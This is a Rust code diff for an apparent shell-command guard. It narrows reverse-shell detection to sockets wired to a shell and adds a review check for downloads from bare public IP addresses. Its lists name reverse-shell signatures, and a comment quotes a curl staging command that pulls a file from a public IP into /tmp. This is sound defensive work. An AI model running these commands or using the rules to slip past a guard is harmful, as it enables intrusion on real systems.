@@ -357,13 +357,47 @@ pub const REVERSE_SHELL_INDICATORS: &[&str] = &[
     "socat udp",
     "0>&1",
     ">&/dev/tcp",
-    "socket.socket",
     "pty.spawn",
-    "use socket",
     "perl -mio",
     "fsockopen",
     "-rsocket",
     "mkfifo /tmp/",
+];
+
+/// Socket-creation primitives that are NOT evidence of a reverse shell alone.
+///
+/// `socket.socket` sat in the list above at score 60, so
+///
+/// ```text
+/// python3 -c "import socket;s=socket.socket();s.connect(('127.0.0.1',8080))"
+/// ```
+///
+/// was denied at HIGH severity with the reason "reverse shell indicator" — which
+/// is factually false. It is a loopback port check, and the semantically identical
+/// `nc -z 127.0.0.1 8080` was allowed. That asymmetry proved the rule was lexical
+/// rather than semantic.
+///
+/// The real cost is not the blocked command. A high-severity verdict whose stated
+/// reason is untrue teaches the operator to discount every other verdict, and a
+/// guard that is not believed is not a control. It also blocked the entire idiom:
+/// any Python socket diagnostic an agent might reasonably write.
+///
+/// A reverse shell is a socket WIRED TO A SHELL, so these escalate only alongside
+/// [`SHELL_WIRING`]. On their own they are not reported.
+const SOCKET_PRIMITIVES: &[&str] = &["socket.socket", "use socket", "socket(af_inet"];
+
+/// What turns a socket into a shell: handing it to an interpreter or to stdio.
+const SHELL_WIRING: &[&str] = &[
+    "subprocess",
+    "os.dup2",
+    "dup2(",
+    "pty.spawn",
+    "/bin/sh",
+    "/bin/bash",
+    "os.system",
+    "popen",
+    "sh -i",
+    "exec(",
 ];
 
 /// Obfuscation patterns (score 30).
@@ -1218,12 +1252,90 @@ pub fn check_protected_read(cmd: &str, protected: &[String]) -> Option<String> {
 }
 
 /// Check for reverse shell indicators. Returns (indicator, score).
+///
+/// Two tiers, because "creates a socket" and "creates a socket wired to a shell"
+/// are different claims and only the second is a reverse shell. Reporting the
+/// first as the second denied ordinary socket diagnostics at high severity with a
+/// reason that was untrue — and an untrue high-severity reason costs credibility
+/// on every other verdict the guard issues.
 pub fn check_reverse_shell(content: &str) -> Option<(&'static str, u32)> {
     let lower = content.to_ascii_lowercase();
-    REVERSE_SHELL_INDICATORS
-        .iter()
-        .find(|i| lower.contains(*i))
-        .map(|i| (*i, 60))
+    // Unambiguous signatures: these mean shell-over-socket on their own.
+    if let Some(i) = REVERSE_SHELL_INDICATORS.iter().find(|i| lower.contains(*i)) {
+        return Some((*i, 60));
+    }
+    // A socket primitive only counts once something wires it to a shell.
+    if SOCKET_PRIMITIVES.iter().any(|p| lower.contains(p))
+        && SHELL_WIRING.iter().any(|w| lower.contains(w))
+    {
+        return Some(("socket handed to a shell or interpreter", 60));
+    }
+    None
+}
+
+/// Fetching from a bare public IP address. Returns (indicator, score).
+///
+/// Dual-use commands were effectively unmanaged: 22 of 24 measured cases got a
+/// plain allow, including
+///
+/// ```text
+/// curl -s http://198.51.100.5/data -o /tmp/d
+/// ```
+///
+/// which is a textbook staging step, scored identically to a loopback health
+/// check. The conclusion drawn at the time was that context is structurally
+/// missing because the API accepts only `{"command"}` — no cwd, no destination, no
+/// task. That is true of *some* dual-use, but not this: the destination is right
+/// there in the command. Nothing was looking at it.
+///
+/// A bare IP literal is the signal. People and package managers use names; hosts
+/// have DNS. Software that fetches from a numeric address is either
+/// infrastructure talking to itself (loopback/private, excluded here) or something
+/// avoiding a name. Scored 25 = `review`, not `deny`: it is suspicious rather than
+/// conclusive, and a false deny costs more than a false review.
+pub fn check_bare_ip_fetch(content: &str) -> Option<(&'static str, u32)> {
+    static IP_URL: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let ip_url = IP_URL.get_or_init(|| {
+        regex::Regex::new(r"(?i)\b(?:https?|ftp)://(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
+            .expect("static bare-ip-url regex")
+    });
+    let lower = content.to_ascii_lowercase();
+    // Only for commands that actually fetch. `ping 8.8.8.8` and
+    // `ssh -i key 10.0.0.5` are not downloads.
+    const FETCHERS: &[&str] = &["curl", "wget", "http ", "httpie", "aria2c", "fetch "];
+    if !FETCHERS.iter().any(|f| lower.contains(f)) {
+        return None;
+    }
+    for caps in ip_url.captures_iter(&lower) {
+        let ip = caps.get(1).map(|m| m.as_str()).unwrap_or("");
+        // Infrastructure talking to itself is the normal case for a numeric
+        // address, and it is exactly what a health check looks like.
+        if !is_external_ip_literal(ip) {
+            continue;
+        }
+        return Some((
+            "fetch from a bare public IP address rather than a hostname",
+            25,
+        ));
+    }
+    None
+}
+
+/// Is this dotted-quad a public address? Loopback, link-local, RFC1918 and the
+/// cloud metadata endpoints are all "the host talking to itself or its platform".
+fn is_external_ip_literal(ip: &str) -> bool {
+    let octets: Vec<u8> = ip.split('.').filter_map(|o| o.parse::<u8>().ok()).collect();
+    if octets.len() != 4 {
+        return false;
+    }
+    match (octets[0], octets[1]) {
+        (127, _) | (10, _) | (0, _) => false,
+        (169, 254) => false, // link-local + cloud metadata (169.254.169.254)
+        (192, 168) => false,
+        (172, b) if (16..=31).contains(&b) => false,
+        (168, 63) => false, // Azure WireServer
+        _ => true,
+    }
 }
 
 /// Check for obfuscation patterns. Returns (indicator, score).
